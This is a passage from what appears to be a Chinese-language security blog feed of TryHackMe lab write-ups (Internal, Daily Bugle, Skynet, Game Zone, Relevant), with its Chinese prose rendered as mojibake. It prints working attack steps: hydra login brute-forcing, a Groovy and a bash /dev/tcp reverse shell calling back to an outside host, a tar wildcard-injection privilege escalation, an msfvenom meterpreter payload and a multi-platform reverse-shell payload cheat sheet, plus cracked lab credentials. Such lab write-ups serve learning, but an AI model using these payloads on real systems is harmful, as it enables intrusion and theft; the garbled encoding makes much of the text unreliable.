class="hljs-number">172.17.0.2:8080</span> aubreanna@<span class="hljs-number">10.10.201.110</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®localhost:8081 å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411292322884.png" alt="image-20241129232248828"></p><p>æˆ‘è¿™é‡Œåˆ©ç”¨hydraå»çˆ†ç ´å¯†ç äº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra -s <span class="hljs-number">8081</span> -V -f -t <span class="hljs-number">50</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> http-form-post <span class="hljs-string">&quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&quot;</span> -l admin -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure><p>èƒ½å¾—åˆ°å¯†ç  spongebob</p><p>ç™»å½•åå°ä¹‹å å†scriptä¸‹å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300053613.png" alt="image-20241130005302498"></p><p>è¿›è¡Œä¸€ä¸ªåå¼¹shell</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">r = Runtime<span class="hljs-selector-class">.getRuntime</span>()<br><br><span class="hljs-selector-tag">p</span> = r<span class="hljs-selector-class">.exec</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.14.74.6/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure><p>å¾—åˆ°shellä¹‹å å†æ¬¡å†optç›®å½•ä¸‹æ‰¾åˆ°rootçš„å¯†ç  tr0ub13guM!@#123</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411300123382.png" alt="image-20241130012326308"></p><p>è¿œç¨‹ç™»å½•å³å¯</p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Daily Bugle</title>
    <link href="/2024/11/08/Daily%20Bugle/"/>
    <url>/2024/11/08/Daily%20Bugle/</url>
    
    <content type="html"><![CDATA[<h1 id="Daily-Bugle"><a href="#Daily-Bugle" class="headerlink" title="Daily Bugle"></a>Daily Bugle</h1><p>æ‰«äº†ä¸€ä¸‹ 22 80 3306ç«¯å£å¼€å¯</p><p>è®¿é—®README.txt å¯ä»¥å¾—åˆ°ç‰ˆæœ¬å· æ˜¯3.7.0</p><p>æ‰¾åˆ°ä¸€ä¸ªsqlæ³¨å…¥çš„æ´</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082215935.png" alt="image-20241108221530848"></p><p>ç”¨sqlmapå¯ä»¥è·‘ã€‚ä½†è¿˜æ˜¯æŒºæ…¢çš„ã€‚</p><p>ä½†æœ€åæ²¡è·‘å‡ºæ•°æ®ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411090017580.png" alt="image-20241109001738334"></p><p>å»æ‰¾ä¸€ä¸‹è¿™ä¸ªcve CVE-2017-8917</p><p><a href="https://github.com/stefanlucas/Exploit-Joomla">https://github.com/stefanlucas/Exploit-Joomla</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Found user [<span class="hljs-string">u&#x27;811&#x27;</span>, <span class="hljs-string">u&#x27;Super User&#x27;</span>, <span class="hljs-string">u&#x27;jonah&#x27;</span>, <span class="hljs-string">u&#x27;jonah@tryhackme.com&#x27;</span>, <span class="hljs-string">u&#x27;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#x27;</span>, <span class="hljs-string">u&#x27;&#x27;</span>, <span class="hljs-string">u&#x27;&#x27;</span>]<br></code></pre></td></tr></table></figure><p>johnçˆ†ä¸€ä¸‹ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john <span class="hljs-number">1</span>.hash --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --format=bcrypt<br></code></pre></td></tr></table></figure><p>ç„¶åç™»å½•åå°ã€‚</p><p>åœ¨ä¸‹é¢è¿™ä¸ªåœ°æ–¹å¯ä»¥ä¿®æ”¹ä»£ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411102141269.png" alt="image-20241110214120170"></p><p>ç„¶åå»è®¿é—®å¯¹åº”çš„è·¯å¾„å³å¯ï¼Œå¼¹ä¸€ä¸ªshell.</p><p>å¼¹è¿‡æ¥çš„ç”¨æˆ·æ˜¯apache åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„configuration.phpé‡Œé¢æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ã€‚</p><p>ç„¶åå¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„å¯†ç ã€‚è¿›æ•°æ®åº“é‡Œé¢æ²¡å…¶ä»–ç”¨æˆ·çš„å¯†ç ã€‚</p><p>è¿™ä¸ªå¯†ç ä¹Ÿæ˜¯jjamesonçš„å¯†ç </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411102301151.png" alt="image-20241110230109925"></p><p>sudo yumææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411102303404.png" alt="image-20241110230309339"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Skynet</title>
    <link href="/2024/11/08/Skynet/"/>
    <url>/2024/11/08/Skynet/</url>
    
    <content type="html"><![CDATA[<h1 id="Skynet"><a href="#Skynet" class="headerlink" title="Skynet"></a>Skynet</h1><p>æ‰«ä¸€ä¸‹ç«¯å£ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081707907.png" alt="image-20241108170732818"></p><p>44 80 22 ç­‰ç«¯å£å¼€æ”¾ï¼Œçœ‹ä¸‹80ç«¯å£ã€‚</p><p>æ‰«ä¸‹åå°æ‰¾åˆ°ç™»å½•çš„åœ°æ–¹ï¼Œå°è¯•çˆ†ç ´å¯†ç ï¼Œç»“æœæ²¡ç»“æœã€‚</p><p>å›åˆ°445ç«¯å£ï¼Œåˆ©ç”¨enum4linuxæ¢æµ‹ä¸€ä¸‹sambaæœåŠ¡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081719421.png" alt="image-20241108171939346"></p><p>ç”¨smbclient å»ç™»å½•anonymous è¿™ä¸ªæ˜¯æ— å¯†ç çš„ã€‚</p><p>è¿›å…¥logsä¸‹æœ‰ä¸‰ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081731951.png" alt="image-20241108173147913"></p><p>åˆ©ç”¨moreå‘½ä»¤è¿›è¡ŒæŸ¥çœ‹ã€‚</p><p>åªæœ‰log1.txté‡Œé¢æœ‰æ–‡ä»¶ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure><p>å¯èƒ½æ˜¯å­—å…¸ï¼Ÿè¯•ä¸€ä¸‹ã€‚</p><p>ç®¡ç†å‘˜åå­—å¹¶ä¸æ˜¯admin è€Œæ˜¯ Miles Dyson</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081754727.png" alt="image-20241108175413621"></p><p>å¾—åˆ°å¯†ç ä¹‹åç™»å½•ã€‚</p><p>åœ¨é‚®ä»¶é‡Œé¢æ‰¾åˆ°milesdysonçš„smbç™»å½•å¯†ç ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">50.223</span>/milesdyson -U milesdyson<br></code></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ°äº†ä¸‹é¢è¿™ä¸ª</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> <span class="hljs-keyword">Add</span> features <span class="hljs-keyword">to</span> beta CMS /<span class="hljs-number">45</span>kra24zxs28v3yd<br><span class="hljs-number">2.</span> <span class="hljs-keyword">Work</span> <span class="hljs-keyword">on</span> T<span class="hljs-number">-800</span> Model <span class="hljs-number">101</span> blueprints<br><span class="hljs-number">3.</span> Spend more <span class="hljs-type">time</span> <span class="hljs-keyword">with</span> my wife<br></code></pre></td></tr></table></figure><p>å»è®¿é—®ä¸€ä¸‹/45kra24zxs28v3yd</p><p>å‘ç°æ²¡å•¥ä¸œè¥¿ï¼Œåå°æ‰«ä¸€ä¸‹ã€‚èƒ½æ‰«åˆ°åˆæ˜¯ä¸€ä¸ªæ–°çš„cms.</p><p>æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåœ¨æœ¬åœ°å†™ä¸€ä¸ªshellï¼Œç„¶åå»åŒ…å«ä¸€ä¸‹ï¼Œè¿›è¡Œä¸€ä¸ªåå¼¹shell.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081842564.png" alt="image-20241108184257438"></p><p>ä¸‹é¢å°±æ˜¯ææƒäº†ã€‚</p><p>å°±æ˜¯ä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ææƒ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081855926.png" alt="image-20241108185542856"></p><p>æˆ‘æƒ³çš„æ˜¯ä¿®æ”¹backup.sh ä»¥rootèº«ä»½è¿è¡Œï¼Œä½†æ˜¯è¿™ä¸ªbackup.shæ²¡æƒé™æ“ä½œã€‚</p><p>è¿™é‡Œçœ‹äº†ä¸€ä¸‹wp è¯´æ˜¯taré€šé…ç¬¦æ³¨å…¥è¿›è¡Œææƒã€‚</p><p>å°±æ˜¯ä¸åˆç†ä½¿ç”¨*(é€šé…ç¬¦)ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œææƒã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081922978.png" alt="image-20241108192256910"></p><p>è¿™ä¸ªshæ–‡ä»¶è¦æ‰§è¡Œçš„æ˜¯åˆ‡æ¢åˆ°webæœåŠ¡å™¨æ ¹ç›®å½•ä¸‹ï¼Œå°†å½“å‰æ‰€æœ‰çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“åŒ…åˆ°æŒ‡å®šçš„å‹ç¼©åŒ…é‡Œé¢ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/var/www/html</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sh -i &gt;&amp; /dev/tcp/10.14.74.6/4444 0&gt;&amp;1&quot;</span> &gt; a.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=bash b.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-params">--checkpoint=1</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082019254.png" alt="image-20241108201927143"></p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.freebuf.com/articles/system/176255">https://www.freebuf.com/articles/system/176255</a></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gamezome</title>
    <link href="/2024/11/04/Game%20Zone/"/>
    <url>/2024/11/04/Game%20Zone/</url>
    
    <content type="html"><![CDATA[<h1 id="gamezome"><a href="#gamezome" class="headerlink" title="gamezome"></a>gamezome</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>åˆ©ç”¨-Fæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°22å’Œ80ç«¯å£å¼€æ”¾ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226140.png"></p><p>å»è®¿é—®80ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç™»å½•æ¡†ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226984.png"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å°è¯•çˆ†ç ´ä¸€ä¸‹å¯†ç ã€‚</p><p>å¥½åƒæ²¡å•¥ç»“æœï¼ŒæŠ“ä¸ªåŒ…ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹çœ‹çœ‹ï¼Œæ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052339119.png" alt="image-20241105233931933"></p><p>å­˜åœ¨çš„è¯ï¼Œå°±å°è¯•èƒ½å¦çˆ†å‡ºè´¦æˆ·å’Œå¯†ç ã€‚</p><p>å¯ä»¥è·‘å‡ºæ¥ï¼Œä½†æ˜¯å°±æ˜¯å¤ªæ…¢äº†ã€‚ã€‚ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -r <span class="hljs-string">&#x27;xxxx/txt&#x27;</span> <span class="hljs-attribute">--dbms</span>=mysql --dump<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061730635.png" alt="image-20241106173007385"></p><p>åˆ©ç”¨johnå»è§£ä¸€ä¸‹è¿™ä¸ªã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">John pass.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --format=Raw-SHA256<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061749145.png" alt="image-20241106174906022"></p><p>å¾—åˆ°å¯†ç ä¹‹åï¼Œsshè¿æ¥ä¸Šå»ã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ss -tulnçœ‹ä¸€ä¸‹ç›‘å¬çš„ä¿¡æ¯ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061808651.png" alt="image-20241106180831588"></p><p>åˆ©ç”¨sshå°†10000ç«¯å£çš„æœåŠ¡æ˜ å°„åˆ°æœ¬åœ°ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061854500.png" alt="image-20241106185417426"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">10000</span>:localhost:<span class="hljs-number">10000</span> agent47@<span class="hljs-number">10.10.169.5</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062014657.png" alt="image-20241106201439520"></p><p>ç„¶åå»è®¿é—®localhost:10000</p><p>æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œç”¨ä¸Šé¢çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¿›å»å³å¯ã€‚</p><p>ç„¶åå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªcmsï¼Œç‰ˆæœ¬å·å¯ä»¥çŸ¥é“ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062017934.png" alt="image-20241106201742824"></p><p>æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059971.png" alt="image-20241106205927779"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059479.png" alt="image-20241106205939361"></p>]]></content>
    
    
    <categories>
      
      <category>Offensive Pentesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Relevant</title>
    <link href="/2024/11/03/Relevant/"/>
    <url>/2024/11/03/Relevant/</url>
    
    <content type="html"><![CDATA[<h1 id="Relevant"><a href="#Relevant" class="headerlink" title="Relevant"></a>Relevant</h1><p>ä¿¡æ¯æ”¶é›†ï¼š</p><p>nmapæ‰«ä¸‹ç«¯å£</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411251457911.png" alt="image-20241125145705709"></p><p>è®¿é—®80ç«¯å£ï¼Œæ˜¯IISæœåŠ¡ å‘ç°445å’Œ139ç«¯å£å¼€å¯ï¼Œå°è¯•åˆ©ç”¨MS17-010</p><p>ä½†æ˜¯å¹¶ä¸å¤ªè¡Œï¼Œåˆ©ç”¨msfæ¨¡å—é‡Œé¢çš„æ°¸æ’ä¹‹è“æ£€æµ‹å‘ç°ï¼Œé€šè¿‡445ç™»å½•æ—¶è¶…æ—¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411251531388.png" alt="image-20241125153157156"></p><p>è¿™ä¸ªæ€è·¯ä¸è¡Œçš„è¯ï¼Œå°±æ¢ä¸€ä¸ªæ€è·¯ æšä¸¾smbæœåŠ¡</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411252121375.png" alt="image-20241125212119274"></p><p>å‘ç°èƒ½æšä¸¾åˆ°ä¸€ä¸ªnt4wrksv</p><p>å‘ç°æ˜¯æ— å¯†ç çš„ é‡Œé¢æœ‰ä¸€ä¸ªpasswords.txtæ–‡ä»¶ æŠŠå®ƒç»™getä¸‹æ¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> passwords.txt<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç»è¿‡base64åŠ å¯†çš„ç”¨æˆ·åå’Œå¯†ç </p><p>è§£ç å¾—åˆ°</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">Bob - !P@<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>W0rD!<span class="hljs-number">123</span><br><br>Bill - Juw4nnaM4n420696969!<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ä¸Šé¢çš„ç”¨æˆ·åå’Œå¯†ç  åˆšå¼€å§‹æƒ³ç€å»å†æ¬¡åˆ©ç”¨ms17-010 æ¥ç€ åæ¥å‘ç°è¿˜æ˜¯ä¸è¡Œ ï¼Œçœ‹ä¸€ä¸‹æ˜¯å¦èƒ½ä¸Šä¼ æ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271711866.png" alt="image-20241127171150724"></p><p>ç»“æœæ˜¯å¯ä»¥çš„ï¼Œä¸‹é¢çš„æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„æ–‡ä»¶</p><p>æ ¹æ®ä¿¡æ¯å¯ä»¥çŸ¥é“æ˜¯ä¸€ä¸ªasp.netæ¡†æ¶ </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271739897.png" alt="image-20241127173923858"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=10.14.74.6 <span class="hljs-attribute">LPORT</span>=6666 -f aspx -o reverse.aspx<br></code></pre></td></tr></table></figure><p>ç„¶å åˆ©ç”¨msfæ¥æ”¶shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST your-thm-ip <br><span class="hljs-built_in">set</span> LPORT listening-port <br>run<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271858068.png" alt="image-20241127185844997"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>whoami /privçœ‹ä¸€ä¸‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411271953159.png" alt="image-20241127195305084"></p><p>èƒ½æœåˆ°SeImpersonatePrivilege èƒ½å¤Ÿè¿›è¡Œææƒ</p><p><a href="https://github.com/itm4n/PrintSpoofer">https://github.com/itm4n/PrintSpoofer</a> ï¼ˆææƒå·¥å…·ä¸‹è½½ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PrintSpoofer64<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">i</span> -c cmd<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411272020835.png" alt="image-20241127202016757"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/u012206617/article/details/130330198">https://blog.csdn.net/u012206617/article/details/130330198</a></p><p>å„ç§ç³»ç»Ÿæ‰€å¯¹åº”çš„é©¬æ€»ç»“ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Linux<br><br>msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt; Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt; Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f elf &gt; shell.elf<br><br>Windows<br><br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f exe &gt; shell.exe<br><br>Mac<br><br>msfvenom -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f macho &gt; shell.machoWeb Payloads<br><br>PHP<br><br>msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br><br>ASP<br><br>msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f asp &gt; shell.asp<br><br>JSP<br><br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br><br>WAR<br><br>msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f war &gt; shell.war Scripting Payloads<br><br>Python<br><br>msfvenom -p cmd/unix/reverse_python <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.py<br><br>Bash<br><br>msfvenom 